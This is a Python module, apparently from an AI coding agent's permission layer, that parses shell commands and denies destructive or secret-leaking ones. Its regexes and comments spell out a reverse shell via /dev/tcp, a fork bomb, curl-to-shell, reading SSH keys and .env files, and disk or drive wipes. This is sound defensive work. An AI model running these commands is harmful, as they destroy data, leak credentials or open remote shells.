"""Hardline denies: commands that are never allowed, in any mode.

Checked before any rule evaluation (and before modes: even ``yolo`` refuses
them). Extendable from config via ``permissions: {hardline: [...]}``.

The command line is first taken apart with a small quote-aware shell parser (:func:`parse`): simple commands are
split on ``&&  ||  ;  |  &  |&``, newlines and subshell parentheses, and everything nested inside them (``$(...)``,
backticks, ``bash -c "..."``, ``eval``, ``ssh host "..."``) is collected, so a denied command cannot hide behind a
lone ``&``, a quote or a substitution.
"""

from __future__ import annotations

import os
import re
import shlex
from collections.abc import Iterator
from contextlib import contextmanager
from contextvars import ContextVar
from dataclasses import dataclass, field
from functools import cache, lru_cache
from urllib.parse import urlsplit

#: (name, regex) pairs matched against the raw command line and every simple command.
HARDLINE_PATTERNS: list[tuple[str, str]] = [
    # rm -rf / and ~ are caught by _rm_check (token based: any flag spelling, quotes, sudo/env wrappers)
    # env / printenv dumping the environment are caught by _env_dump_check (token based: it lets `env VAR=x cmd`,
    # `env -u X cmd` and `env -i cmd` fall through to the real command's checks, which a raw regex could not)
    ("mkfs", r"\b(?:mkfs(?:\.\w+)?|mke2fs|mke3fs|mkdosfs|mkntfs|mkreiserfs)\b"),  # mkfs / mkfs.ext4 / mke2fs ...
    ("dd-to-device", r"\bdd\b.*\bof=/dev/"),  # dd of=/dev/...
    # a function that pipes itself into itself in the background, however it is named (`:(){ :|:& }`, `f(){ f|f& }`)
    (
        "fork-bomb",
        r"(?:\b(\w+)\s*\(\)\s*\{\s*\1\s*\|\s*\1\s*&\s*\}"
        r"|\bfunction\s+(\w+)\s*(?:\(\))?\s*\{\s*\2\s*\|\s*\2\s*&\s*\}"
        r"|:\s*\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\})",
    ),
    # bash's network redirects: the usual reverse shell (`bash -i >& /dev/tcp/HOST/PORT 0>&1`)
    ("dev-tcp", r"[<>]&?\s*/dev/(?:tcp|udp)/"),
    ("pipe-to-shell", r"\bcurl\b[^|]*\|\s*(?:sudo\s+)?(?:sh|bash)\b"),  # curl ... | sh
    ("wget-pipe-to-shell", r"\bwget\b[^|]*-O\s*-\s*[^|]*\|\s*(?:sudo\s+)?(?:sh|bash)\b"),
    # (?i): drvfs (/mnt/c) and macOS open ~/.ssh for ~/.SSH and .env for .ENV
    ("ssh-key-cat", r"(?i)\bcat\b[^\n;|&]*\.ssh/"),  # cat ~/.ssh/...
    # cat .env / *.env, but not the committed templates (.env.example ...)
    ("dotenv-cat", r"(?i)\bcat\b[^\n;|&]*\.env\b(?!\.(?:example|sample|template|dist)\b)"),
    # main/master as a whole ref (an operand, the end of a refspec, refs/heads/...), not inside a branch name such as
    # fix/main or main-docs
    (
        "git-push-force-main",
        r"\bgit\b[^\n;|&]*\bpush\b(?=[^\n;|&]*--force)"
        r"(?=[^\n;|&]*(?:[\s:+]|refs/heads/)(?i:main|master)(?![^\s;|&]))",
    ),
]

#: Remote hosts whose services must never be restarted from here. ``ssh <host> "<remote command>"`` can carry
#: ``&&``/``;`` inside the quotes, so these run on each *simple* command (quotes kept together), never on the raw
#: multi-command line, where ``.*`` would mix unrelated commands.
_REMOTE_HOSTS = ("protected-host-a", "protected-host-b")
_SSH_RESTART_PATTERNS = [
    (f"{host}-{what}-restart", rf"\bssh\b.*\b{host}\b.*\b{tool}\b.*\b(?:restart|stop|kill|down|rm)\b")
    for host in _REMOTE_HOSTS
    for what, tool in (("service", "systemctl"), ("docker", "docker"), ("compose", "docker-compose"))
]

#: A Windows drive target whose recursive deletion wipes the host (issue #169): a drive root (``C:``, ``C:\``, ``C:/``),
#: its ``Users`` tree (``C:\Users``, ``C:\Users\<name>``), the Windows directory (``C:\Windows``) or the installed
#: programs (``C:\Program Files``, ``C:\Program Files (x86)``, ``C:\ProgramData``), with ``/`` or ``\`` separators. A
#: string fragment (no flags), used inside the case-insensitive launcher patterns below; backslashes survive here
#: because these run on the raw simple command, before the posix tokenizer (which would eat them) ever sees it.
#: ``Program Files`` has a space in it, so it counts only where the quoted word (or the command) ends after it:
#: ``"C:\Program Files Custom"`` is another folder.
_WIN_DRIVE_DIR = (
    r"[A-Za-z]:(?:[\\/](?:users(?:[\\/][^\\/\s\"']+)?|windows|programdata"
    r"|program files(?: \(x86\))?(?=[\\/]?(?:\*(?:\.\*)?)?(?:[\"']|$))))?"
)
#: The user's profile (or the system drive or Windows directory) named through a variable: cmd's ``%USERPROFILE%``
#: (``%HOMEDRIVE%%HOMEPATH%``, ``%SystemDrive%``, ``%SystemRoot%``, ``%windir%``), PowerShell's ``$env:USERPROFILE``
#: (``${env:...}``) and ``$HOME``, and ``~``. It must start a word, so ``backup~`` is a file name, not the profile.
_WIN_VARS = r"(?:userprofile|homedrive|homepath|systemdrive|systemroot|windir)"
_WIN_PROFILE_VAR = (
    r"(?:(?<=[\s\"'=(,:])|^)"
    r"(?:(?:%" + _WIN_VARS + r"%)+|(?:\$\{?env:" + _WIN_VARS + r"\}?)+|\$\{?home\}?|~)"
)
#: A whole-tree target: one of the two above, then an optional separator and the ``*`` / ``*.*`` wildcard of everything
#: in it (``C:\*``, ``C:\*.*``, ``%USERPROFILE%\*``), then the end of the word (``(?=[\s"']|$)``). That end stops it at
#: the word's end, so a *deeper* path such as ``C:\Users\<name>\project`` or ``$env:USERPROFILE\proj\build`` -- an
#: ordinary project folder -- is NOT one of these.
_WIN_DRIVE = r"(?:" + _WIN_DRIVE_DIR + "|" + _WIN_PROFILE_VAR + r")[\\/]?(?:\*(?:\.\*)?)?(?=[\s\"']|$)"
#: PowerShell's ``-Recurse``: any unambiguous prefix of it (``-r``, ``-rec``, ``-Recurse``; Remove-Item has no other
#: parameter starting with r), starting a word, after a hyphen or the en/em dash PowerShell also accepts.
_PS_RECURSE = r"(?<![\w-])[-\u2013\u2014]r(?:e(?:c(?:u(?:r(?:s(?:e)?)?)?)?)?)?\b"
#: Remove-Item and the PowerShell aliases for it.
_PS_REMOVE = r"\b(?:remove-item|rm|ri|del|erase|rd|rmdir)\b"

#: A verb that is the command being run: at the start of the simple command, right after a launcher token
#: (``powershell Format-Volume``), or after a launcher's opening quote (``cmd /c "diskpart"``). Keeps the format/
#: diskpart rules below off prose and filenames. A string fragment used inside those case-insensitive patterns.
_WIN_CMD_POS = r"(?:^\s*|\b(?:cmd(?:\.exe)?|powershell|pwsh(?:\.exe)?)\b[^\"'\n]*[\s\"'])"

#: Windows / WSL destroyers, matched on each simple command (``cmd /c "..."`` and ``powershell -Command "..."`` keep
#: their quoted script in the sub, so the verb and target are visible). The recursive-delete rules fire only with a
#: launcher (or the verb starting the command) AND a recursive flag AND a whole-tree target from :data:`_WIN_DRIVE`,
#: in any order; ``rmdir /s /q build`` or ``Remove-Item -Recurse .\build`` has no such target, so a project subfolder
#: delete is never caught.
_WINDOWS_PATTERNS: list[tuple[str, str]] = [
    # cmd.exe /c|/k  del|erase .../s  or  rd|rmdir /s  on a drive root / \Users[\<name>] / \Windows / the programs
    (
        "win-cmd-recursive-delete",
        r"(?i)(?:\bcmd(?:\.exe)?\b(?=.*\s/[ck]\b)(?=.*\b(?:del|erase|rd|rmdir)\b)|^\s*(?:del|erase|rd|rmdir)\b)"
        r"(?=.*/s\b)(?=.*" + _WIN_DRIVE + ")",
    ),
    # powershell|pwsh (with -Command/-c or bare)  Remove-Item or an alias of it ... -Recurse  on those targets
    (
        "win-powershell-recursive-delete",
        r"(?i)(?:\b(?:powershell|pwsh)(?:\.exe)?\b(?=.*" + _PS_REMOVE + r")|^\s*remove-item\b)"
        r"(?=.*" + _PS_RECURSE + r")(?=.*" + _WIN_DRIVE + ")",
    ),
    # Format-Volume (PowerShell cmdlet), diskpart (partition tool) and the legacy `format X:` command only count as the
    # command being run, not as a word in prose or a filename (`cat notes-about-diskpart.md`, `echo "run diskpart"`):
    # _WIN_CMD_POS requires the verb to start the simple command, follow a launcher's quote (`cmd /c "diskpart ..."`),
    # or directly follow a launcher token (`powershell Format-Volume ...`).
    ("win-format-volume", r"(?i)" + _WIN_CMD_POS + r"format-volume\b"),
    ("win-format-drive", r"(?i)" + _WIN_CMD_POS + r"format\s+[A-Za-z]:[\\/]?(?=[\s\"']|$)"),
    ("win-diskpart", r"(?i)" + _WIN_CMD_POS + r"diskpart(?:\.exe)?\b"),
]
HARDLINE_SIMPLE_PATTERNS: list[tuple[str, str]] = [*_SSH_RESTART_PATTERNS, *_WINDOWS_PATTERNS]

#: Every hardline rule by name, for display (/permissions, the setup wizard): the regex ones, the token-based rm check
#: (see _rm_check) and the per-command ssh checks.
HARDLINE_NAMES: list[str] = [
    "rm-rf-root",
    "rm-rf-home",
    # read/grep/glob, or a bash argument, < source or glob that reads or sends keys, ~/.config/k3code,
    # /proc/*/environ, .env (engine.py: printing, testing, chmod, ssh -i and a copy destination are not reads;
    # rm, source, git add and --env-file ask a person)
    "sensitive-path",
    "fetch-and-run",  # a shell/interpreter running a $(...), `...` or <(...) that downloads (see _fetch_run_check)
    "download-and-run",  # a file an earlier command of the line downloaded, run by a later one (_download_run_check)
    "block-device-write",  # mkswap/wipefs/shred/parted... or a redirect/cp/tee onto a disk (see _block_device_check)
    "chmod-recursive-root",  # chmod/chown/chgrp -R on /, ~ or $HOME (also chown-, chgrp-recursive-root)
    "rsync-delete-root",  # rsync --delete into /, ~ or $HOME (see _destroy_check)
    "git-push-mirror",
    "git-push-delete-main",  # git push --delete/-d main, git push <remote> :main (see _git_push_check)
    "env-dump",  # env / printenv / export -p / set / declare -x printing the environment (see _env_dump_check)
    "scan-budget",  # a command too long to parse within the scan budget (see check)
    "scan-depth",  # a command nested deeper than the parser follows (see check)
    *(n for n, _ in HARDLINE_PATTERNS),
    *(n for n, _ in HARDLINE_SIMPLE_PATTERNS),
]

_COMPILED: list[tuple[str, re.Pattern[str]]] = [(name, re.compile(rx)) for name, rx in HARDLINE_PATTERNS]
_COMPILED_SIMPLE: list[tuple[str, re.Pattern[str]]] = [(n, re.compile(r)) for n, r in HARDLINE_SIMPLE_PATTERNS]

#: Wrappers that run what follows (skipped when looking for the real command).
_WRAPPERS = frozenset(
    {
        "sudo",
        "doas",
        "env",
        "nohup",
        "time",
        "nice",
        "ionice",
        "command",
        "builtin",
        "exec",
        "timeout",
        "stdbuf",
        "setsid",
        "chrt",
    }
)
#: Windows interpreters reached from a WSL install through interop: ``powershell.exe``, ``cmd.exe``, ``pwsh``,
#: ``wsl.exe`` and the classic script hosts all run arbitrary code from their arguments, so they count as launchers
#: (never an ``always allow <prefix>`` rule) and the hardline looks inside what they are told to run. Matched after
#: lower-casing and dropping a Windows executable suffix, because drvfs (``/mnt/c``) is case-insensitive and interop
#: invokes ``foo.exe``: ``PowerShell.exe`` and ``/mnt/c/.../powershell.exe`` are the same program (issue #169).
WINDOWS_LAUNCHERS = frozenset(
    {
        "powershell",
        "pwsh",
        "cmd",
        "wsl",
        "wslg",
        "cscript",
        "wscript",
        "mshta",
        "rundll32",
        "regsvr32",
    }
)
#: How interop spells a Windows interpreter binary (``powershell.exe``); not script/data suffixes like ``.ps1``.
_WINDOWS_EXEC_SUFFIX = re.compile(r"\.(?:exe|com|bat)$")


def _windows_program(name: str) -> str:
    """``name`` (an argv0 basename) lower-cased and without a Windows executable suffix: ``PowerShell.EXE`` ->
    ``powershell``."""
    return _WINDOWS_EXEC_SUFFIX.sub("", name.lower())


def _windows_launcher(name: str) -> bool:
    """``name`` (an argv0 basename) is a Windows interpreter reached through WSL interop (see WINDOWS_LAUNCHERS)."""
    return _windows_program(name) in WINDOWS_LAUNCHERS


#: wsl.exe options that take a value; ``-e``/``--exec``/``--`` end its options.
_WSL_VALUE_OPTS = frozenset({"-d", "--distribution", "--distribution-id", "-u", "--user", "--cd", "--shell-type"})
#: PowerShell parameters that take a value (lower case, no leading ``-``): any prefix of one is the parameter, as
#: PowerShell accepts abbreviations (``-ExecutionPol``). Aliases that are no prefix are listed apart.
_PS_VALUE_PARAMS = (
    *("executionpolicy", "windowstyle", "version", "psconsolefile", "inputformat", "outputformat"),
    *("configurationname", "configurationfile", "settingsfile", "workingdirectory", "custompipename"),
)
_PS_VALUE_ALIASES = frozenset({"ep", "if", "of", "wd"})


def _windows_command_line(name: str, args: list[str]) -> list[str]:
    """The command line a Windows launcher runs from its arguments, joined as it joins them: ``wsl.exe [options]
    <command ...>`` (also after ``-e``/``--exec``/``--``), ``cmd.exe ... /c <command ...>`` (``/k``, ``/r``) and
    ``powershell.exe ... -Command <command ...>`` (any prefix of ``-Command``, or the first positional argument, which
    Windows PowerShell runs as the command). Read like the script of ``bash -c``, so the hardline sees an unquoted
    ``wsl.exe rm -rf ~`` or ``cmd.exe /c wsl rm -rf ~`` (issue #169). ``-File`` and ``-EncodedCommand`` give none."""
    prog = _windows_program(name)
    rest: list[str] = []
    if prog == "wsl":
        i = 1 if args[:1] == ["~"] else 0  # `wsl ~ ...` starts in the home directory
        while i < len(args) and args[i].startswith("-"):
            i += 1
            if args[i - 1] in ("-e", "--exec", "--"):
                break
            if args[i - 1] in _WSL_VALUE_OPTS:
                i += 1
        rest = args[i:]
    elif prog == "cmd":
        for i, a in enumerate(args):
            if a[:2].lower() in ("/c", "/k", "/r"):
                rest = [a[2:], *args[i + 1 :]] if a[2:] else args[i + 1 :]
                break
    elif prog in ("powershell", "pwsh"):
        i = 0
        while i < len(args):
            a = args[i]
            if a[:1] not in ("-", "/"):
                rest = args[i:]
                break
            word, colon, _ = a.lstrip("-/").lower().partition(":")
            if word and "command".startswith(word):
                rest = args[i + 1 :]
                break
            encoded = word in ("e", "ec") or (len(word) > 1 and "encodedcommand".startswith(word))
            if word and ("file".startswith(word) or encoded):
                break
            value = word in _PS_VALUE_ALIASES or any(p.startswith(word) for p in _PS_VALUE_PARAMS)
            i += 2 if word and value and not colon else 1
    return [" ".join(rest)] if rest else []


#: Commands that run arbitrary code from their arguments: an "always allow <prefix>" rule must never be offered for
#: them (one click on `python3 *` or `ssh *` would otherwise allow everything).
LAUNCHERS = frozenset(
    {
        "sh",
        "bash",
        "zsh",
        "dash",
        "ksh",
        "fish",
        "eval",
        "trap",
        "ssh",
        "xargs",
        "parallel",
        "su",
        "watch",
        "find",
        "python",
        "python3",
        "node",
        "perl",
        "ruby",
        "php",
        "lua",
        "awk",
        "gawk",
        "sed",
        "tee",
        "source",
        ".",
        *_WRAPPERS,
    }
)
#: Commands whose arguments name what runs (a package, a module, a script, a target, a container): a learned or
#: proposed ``<prefix> *`` rule (``uv *``, ``npx *``, ``docker run *``) would allow anything at all, so they are only
#: ever proposed as the exact command. Separate from LAUNCHERS, which also drives payload parsing.
WILDCARD_UNSAFE = frozenset(
    {"uv", "uvx", "npx", "bunx", "deno", "node", "perl", "ruby", "php", "sh", "bash", "zsh", "env", "xargs", "make"}
)
_WILDCARD_UNSAFE_PREFIXES = ("pip", "python")
_WILDCARD_UNSAFE_PAIRS = frozenset(
    {
        ("pnpm", "dlx"),
        ("pnpm", "exec"),
        ("bun", "x"),
        ("npm", "exec"),
        ("docker", "run"),
        ("docker", "exec"),
        ("podman", "run"),
        ("podman", "exec"),
        ("kubectl", "exec"),
    }
)


def _is_launcher_name(name: str) -> bool:
    """``name`` (an argv0 basename) runs code from its arguments: a POSIX launcher (LAUNCHERS) or a Windows
    interpreter reached through WSL interop (WINDOWS_LAUNCHERS)."""
    return name in LAUNCHERS or _windows_launcher(name)


def wildcard_unsafe(command: str) -> bool:
    """``command`` (or a rule pattern) starts with a command that must never get a ``<prefix> *`` rule (see
    WILDCARD_UNSAFE and WINDOWS_LAUNCHERS), including ``git -c key=value ...`` (a config value can name a program to
    run)."""
    toks = _tokens(command)
    while toks and _is_assignment(toks[0]):
        toks = toks[1:]
    if not toks:
        return False
    root = os.path.basename(toks[0])
    if root in WILDCARD_UNSAFE or root.startswith(_WILDCARD_UNSAFE_PREFIXES) or _windows_launcher(root):
        return True
    if root == "git":
        i = 1
        while i < len(toks) and toks[i].startswith("-"):
            if toks[i].startswith(("-c", "--config-env")):
                return True
            i += 2 if toks[i] in _GIT_VALUE_OPTS else 1
        return False
    operands = [t for t in toks[1:] if not t.startswith("-")]
    return bool(operands) and (root, operands[0]) in _WILDCARD_UNSAFE_PAIRS


_DANGEROUS_RM_TARGETS = frozenset(
    {
        "/",
        "/*",
        "~",
        "~/*",
        "$HOME",
        "${HOME}",
        "$HOME/*",
        "${HOME}/*",
        "/home",
        "/etc",
        "/usr",
        "/var",
        "/boot",
        "/bin",
        "/lib",
        "/lib64",
        "/sbin",
        "/root",
        "/opt",
        "/srv",
    }
)

#: Top-level folders of a Windows drive whose recursive delete wipes the host side (lower case, as drvfs folds case):
#: ``rm -rf`` of the drive, one of these or a profile below ``Users`` wipes the Windows host from inside WSL (issue
#: #169). A deeper path such as ``/mnt/c/Users/nils/project`` is a project folder and is left alone (see
#: windows_rm_target).
_WINDOWS_DRIVE_SUBDIRS = frozenset({"users", "windows", "program files", "program files (x86)", "programdata"})
#: The default WSL automount: a Windows drive is mounted at ``/mnt/<letter>``. A custom ``automount.root`` is read
#: from /proc/mounts instead (see :func:`k3code.permissions.engine.windows_drives`).
_DEFAULT_MNT_DRIVE = re.compile(r"^(/mnt/[a-z])(?:/|$)")


def _windows_drive_of(base: str, drives: list[str]) -> str | None:
    """The Windows drive root ``base`` (lower case) sits on or is: a drvfs mount from ``drives``, or the default
    ``/mnt/<letter>`` automount."""
    for d in drives:
        d = d.rstrip("/")
        if base == d or base.startswith(d + "/"):
            return d
    m = _DEFAULT_MNT_DRIVE.match(base)
    return m.group(1) if m else None


def windows_rm_target(base: str, drives: list[str]) -> bool:
    """``base`` (an expanded rm target, lower case, a trailing ``/*`` glob allowed) is a Windows drive root, a drive
    glob, one of its system folders (Users, Windows, ...) or a profile root ``<drive>/Users/<name>`` under one of the
    WSL ``drives`` or the default ``/mnt/<letter>``. Deleting any of these wipes the host side of a WSL install."""
    if base.endswith("/*"):
        base = base[:-2]
    drive = _windows_drive_of(base, drives)
    if drive is None:
        return False
    if base == drive:
        return True
    rest = base[len(drive) + 1 :].split("/")
    if len(rest) == 1 and rest[0] in _WINDOWS_DRIVE_SUBDIRS:
        return True
    return len(rest) == 2 and rest[0] == "users"  # a per-user profile root (its name is not known in advance)


def check(
    command: str, extra_patterns: list[str] | None = None, *, cwd: str | None = None, home: str | None = None
) -> str | None:
    """Return the hardline rule name if ``command`` is hardline-denied, else None.

    The regexes run on the cleaned command line (comments, line continuations and heredoc bodies removed) and on every
    simple command, its normalised argv (:func:`normalize_argv`) and everything nested inside it (``$(...)``,
    backticks, ``<(...)``, ``bash -c "..."``, ``eval``, ``ssh host "..."``, the substitutions of an unquoted heredoc
    body and the script a heredoc feeds to a shell). The structural checks (rm targets, git
    push, environment dumps, downloads fed to a shell) run on the normalised argv and the pipelines. ``cwd`` and
    ``home`` expand ``$PWD``, ``~`` and ``$HOME`` in rm targets (home defaults to the real one).
    """
    return check_parse(command, extra_patterns, cwd=cwd, home=home)[0]


def check_parse(
    command: str, extra_patterns: list[str] | None = None, *, cwd: str | None = None, home: str | None = None
) -> tuple[str | None, Parsed]:
    """:func:`check` and the parse it read (``parse(command)``): the engine decides on that parse instead of parsing a
    long command line a second time. It looks up at most _TILDE_MAX_USERS ``~name`` users (see lookup_scope)."""
    with lookup_scope():
        return _check_parse(command, extra_patterns, cwd, home)


def _check_parse(
    command: str, extra_patterns: list[str] | None, cwd: str | None, home: str | None
) -> tuple[str | None, Parsed]:
    home = home if home is not None else os.path.expanduser("~")
    budget = [_SCAN_BUDGET]
    parsed = parse(command, budget=budget)
    # past the scan budget a substitution's end is unresolved and the text after it was never read as commands, and
    # past the nesting the parser follows the commands in there were never read either: whatever runs there is
    # unknown, so the command is denied rather than allowed unchecked (yolo too). The checks below cannot lift that
    # deny and would tokenise every nesting level of such a command, so they are skipped.
    if budget[0] < 0 or parsed.too_deep:
        return ("scan-budget" if budget[0] < 0 else "scan-depth"), parsed
    _reserve_users(parsed.clean)
    dirs = _Dirs([cwd], cwd, home, _cdpath_entries(command))
    try:
        return _match(parsed.clean, extra_patterns) or _check_parsed(parsed, extra_patterns, dirs), parsed
    except _TooDeep:  # a simple command that alternates wrappers and reserved words endlessly (see _command_argv)
        return "scan-depth", parsed


def _check_parsed(parsed: Parsed, extra: list[str] | None, dirs: _Dirs) -> str | None:
    # relative rm/find targets are read in every directory the sub may run in, followed through the line (see _Dirs)
    home = dirs.home
    need = {k for ks in parsed.child_subs for k in ks}
    where: dict[int, _Where] = {}  # the directories of the subs a child came from, taken at that sub
    fetched: set[str] = set()  # files an earlier command of the line downloaded (see _download_run_check)
    for k, sub in enumerate(parsed.subs):
        if k in need:
            where[k] = dirs.where()
        words = _tokens(sub)
        argv = _command_argv(words)
        # `$(echo /)` in a delete or push target is `/`: the same checks on the line with those spelled out
        spelled = _resolve_echo(sub) if "echo" in sub else sub
        sargv = argv if spelled == sub else _command_argv(_tokens(spelled))
        hit = (
            _match(sub, extra)
            or _match(" ".join(argv), extra)
            or _simple_check(sub)
            or _rm_check(argv, dirs, home)
            or _find_check(argv, dirs, home)
            or _git_push_check(argv)
            or _env_dump_check(sub)
            or _fetch_run_check(argv, parsed.sub_payloads[k])
            or _destroy_check(argv, sub, home)
            or _download_run_check(argv, fetched)
            or (sargv is not argv and (_rm_check(sargv, dirs, home) or _git_push_check(sargv)))
        )
        if hit:
            return hit
        fetched.update(_download_targets(argv, sub))
        dirs.follow(argv, sub)
    hit = _pipeline_check(parsed.pipelines) or _xargs_rm_check(parsed.pipelines, dirs, home)
    if hit:
        return hit
    for child, ks in zip(parsed.children, parsed.child_subs, strict=True):
        start = [where[k] for k in ks if k in where]
        hit = _match(child.clean, extra) or _check_parsed(child, extra, dirs.spawn(start))
        if hit:
            return hit
    return None


#: A pending heredoc: (delimiter, ``<<-`` strips leading tabs, quoted).
HeredocWord = tuple[str, bool, bool]


def _heredoc_word(text: str, i: int) -> tuple[int, HeredocWord | None]:
    """The ``<<``/``<<-`` at ``i`` and its delimiter word, read the way bash reads it: the whole word up to a blank or
    an operator, quotes removed; a quote or a backslash anywhere in it makes the body data (``E'OF'`` is ``EOF``,
    quoted). Returns the index after the word, and None when the word is missing or bash versions read it differently
    (``$'EOF'``, ``\\<newline>``, an open quote, ``$(``): the caller then cannot tell where the body ends."""
    tabs = text.startswith("<<-", i)
    i += 3 if tabs else 2
    n = len(text)
    while i < n and text[i] in " \t":
        i += 1
    start, word, quoted = i, [], False
    while i < n and text[i] not in " \t\n;&|()<>":
        c = text[i]
        if c == "\\" and i + 1 < n and text[i + 1] != "\n":
            word.append(text[i + 1])
            quoted, i = True, i + 2
        elif c in "'\"" and (j := text.find(c, i + 1)) > 0 and not (c == '"' and re.search(r"[\\$`]", text[i:j])):
            word.append(text[i + 1 : j])
            quoted, i = True, j + 1
        elif c in "\\'\"`" or text.startswith(("$'", '$"', "$(", "${", "$["), i) or (c == "#" and i == start):
            return i, None
        else:
            word.append(c)
            i += 1
    return i, (("".join(word), tabs, quoted) if i > start else None)


def _skip_heredoc_bodies(text: str, i: int, delims: list[HeredocWord], bodies: list[str] | None = None) -> int:
    """From the start of a line at ``i``, skip the bodies of the pending heredocs ``delims`` (consumed). A body ends at
    the first line that is exactly its delimiter (``<<-`` strips leading tabs only); in an unquoted body a line that
    ends in an odd number of backslashes runs on into the next before that comparison, as in bash. ``bodies``
    collects the text of each body, without its delimiter line."""
    n = len(text)
    while delims:
        delim, tabs, quoted = delims.pop(0)
        start = end = i
        while i < n:
            end, line = i, ""
            while True:
                eol = text.find("\n", i)
                eol = n if eol < 0 else eol
                part, i = text[i:eol], eol + 1
                if quoted or (len(part) - len(part.rstrip("\\"))) % 2 == 0 or i >= n:
                    line += part
                    break
                line += part[:-1]
            if (line.lstrip("\t") if tabs else line) == delim:
                break
        else:
            end = n  # no delimiter line: the body runs to the end of the text
        if bodies is not None:
            bodies.append(text[start:end])
    return i


def _subst_payload(text: str, at: int, end: int) -> str:
    """The payload of the ``$(``/``<(``/``>(`` at ``at`` that closes at ``end``. ``$((...))`` is arithmetic: its payload
    is the ``((...))`` command it equals, where a ``<<`` is a shift."""
    return text[at + 1 : end + 1] if text.startswith("$((", at) else text[at + 2 : end]


def _backtick_end(text: str, at: int) -> int:
    """Index of the backtick that closes the one at ``at``: the first one no backslash escapes; -1 when none does."""
    j, n = at + 1, len(text)
    while j < n and text[j] != "`":
        j += 2 if text[j] == "\\" else 1
    return j if j < n else -1


def _unescape_backticks(payload: str, dquoted: bool = False) -> str:
    """The command bash runs for a backtick ``payload``: a backslash before `` ` ``, ``\\`` or ``$`` (in double quotes
    also before ``"``) is dropped, any other stays (``\\x`` is ``\\x``)."""
    escaped = '\\`$"' if dquoted else "\\`$"
    return re.sub(r"\\([\s\S])", lambda m: m.group(1) if m.group(1) in escaped else m.group(0), payload)


def _body_payloads(body: str, budget: list[int] | None = None) -> tuple[list[str], bool]:
    """The ``$(...)`` and backtick payloads of an unquoted heredoc body (the shell runs them), and whether one is
    unterminated or read differently by bash and dash. Quotes mean nothing in a body, a backslash escapes the next
    character (``\\$(x)`` is text) and ``\\<newline>`` is removed, as on the command line (``$\\<newline>(x)``
    runs)."""
    body = re.sub(r"\\([\s\S])", lambda m: "" if m.group(1) == "\n" else m.group(0), body)
    out: list[str] = []
    unsure = False
    i, n = 0, len(body)
    while i < n:
        c = body[i]
        if c == "\\":
            i += 2
        elif body.startswith("$(", i):
            end = _match_paren(body, i + 1, budget=budget)
            if end < 0:  # unbalanced, or past the scan budget
                return [*out, body[i + 2 :]], True
            out.append(_subst_payload(body, i, end))
            i = end + 1
        elif c == "`":
            j = _backtick_end(body, i)
            # bash keeps the backslash of `\"` in the backticks of a body, dash drops it: both readings are checked,
            # and a payload the two read differently is unsure
            raw = body[i + 1 :] if j < 0 else body[i + 1 : j]
            readings = list(dict.fromkeys([_unescape_backticks(raw), _unescape_backticks(raw, dquoted=True)]))
            out += dict.fromkeys([raw, *readings])  # the raw text too, as before the unescaping
            if j < 0:
                return out, True
            unsure = unsure or len(readings) > 1
            i = j + 1
        else:
            i += 1
    return out, unsure


@lru_cache(maxsize=64)
def _compiled_extra(patterns: tuple[str, ...]) -> tuple:
    """User config hardline regexes compiled once: _match runs on every bash call (_hardline validated them)."""
    out = []
    for rx in patterns:
        if not rx.strip():
            continue  # a blank pattern would match every command (config load and doctor name it)
        try:
            out.append(re.compile(rx))
        except (re.error, OverflowError, RecursionError):
            continue  # _hardline reports the bad entry and substitutes UNREADABLE_HARDLINE
    return tuple(out)


def _match(text: str, extra_patterns: list[str] | None) -> str | None:
    for name, rx in _COMPILED:
        if rx.search(text):
            return name
    if extra_patterns:
        for i, rx in enumerate(_compiled_extra(tuple(extra_patterns))):
            if rx.search(text):
                return f"config-hardline-{i}"
    return None


def _simple_check(sub: str) -> str | None:
    for name, rx in _COMPILED_SIMPLE:
        if rx.search(sub):
            return name
    return None


@lru_cache(maxsize=64)
def _split_words(sub: str) -> tuple[str, ...]:
    try:
        return tuple(shlex.split(sub, posix=True))
    except ValueError:
        return tuple(sub.split())


def _tokens(sub: str) -> list[str]:
    """shlex words of ``sub``. shlex is slow and the same text is split again for each reading of a nested command, so
    the result is cached (a copy is returned: callers edit it)."""
    return list(_split_words(sub))


def _unit_end(text: str, i: int) -> int:
    """Index of the last character of the ``$(...)``, backtick or ``${...}`` at ``i``, read as one unit as the shell
    reads it (the quotes in it are its own); -1 when none starts there, -2 when it does not close. Nested ``${`` are
    counted, not recursed into, so no depth of them is left unread."""
    if text.startswith("$(", i):
        end = _match_paren(text, i + 1)
        return end if end >= 0 else -2
    if text.startswith("`", i):
        end = _backtick_end(text, i)
        return end if end >= 0 else -2
    if not text.startswith("${", i):
        return -1
    depth, j, n = 1, i + 2, len(text)
    while j < n:
        c = text[j]
        if c == "\\":
            j += 2
        elif c in "'\"":
            k = text.find(c, j + 1)
            if k < 0:
                return -2
            j = k + 1
        elif text.startswith("${", j):
            depth += 1
            j += 2
        elif c == "}":
            depth -= 1
            if depth == 0:
                return j
            j += 1
        elif text.startswith("$(", j) or c == "`":
            end = _unit_end(text, j)  # _match_paren or _backtick_end: no recursion
            if end < 0:
                return -2
            j = end + 1
        else:
            j += 1
    return -2


def _unquoted_brace(unit: str) -> str:
    """The text an unquoted ``${...}`` gives the command it is an argument of when its word is used: the shell removes
    the quotes and backslashes of the word (``${x:+'`a`'}`` hands on `` `a` ``); ``$(...)`` and backticks stay as
    written, and ``"..."`` drops only the backslashes it drops on the command line."""
    out: list[str] = []
    i, n = 0, len(unit)
    while i < n:
        c = unit[i]
        if c == "\\":
            out.append(unit[i + 1 : i + 2])
            i += 2
        elif c == "'":
            j = unit.find("'", i + 1)
            j = n if j < 0 else j
            out.append(unit[i + 1 : j])
            i = j + 1
        elif c == '"':
            j = i + 1
            while j < n and unit[j] != '"':
                if unit[j] == "\\" and j + 1 < n:
                    nxt = unit[j + 1]
                    out.append(nxt if nxt in '$`"\\' else unit[j : j + 2])
                    j += 2
                elif not unit.startswith("${", j) and (end := _unit_end(unit, j)) >= 0:
                    out.append(unit[j : end + 1])
                    j = end + 1
                else:
                    out.append(unit[j])
                    j += 1
            i = j + 1
        elif not unit.startswith("${", i) and (end := _unit_end(unit, i)) >= 0:
            out.append(unit[i : end + 1])
            i = end + 1
        else:
            out.append(c)
            i += 1
    return "".join(out)


def _dquoted_brace(unit: str) -> str:
    """The ``${...}`` ``unit`` of a double-quoted word as the shell passes it on: bash and dash drop the backslash of
    `` \\` ``, ``\\$``, ``\\"``, ``\\\\`` and ``\\}`` in it and remove ``\\<newline>`` (any other ``\\x`` stays), so the
    inner shell of ``bash -c "${x:+\\`y\\`}"`` runs ``y``. The ``$(...)`` and backtick units in it are kept as written:
    the outer shell runs them and parse reads them."""
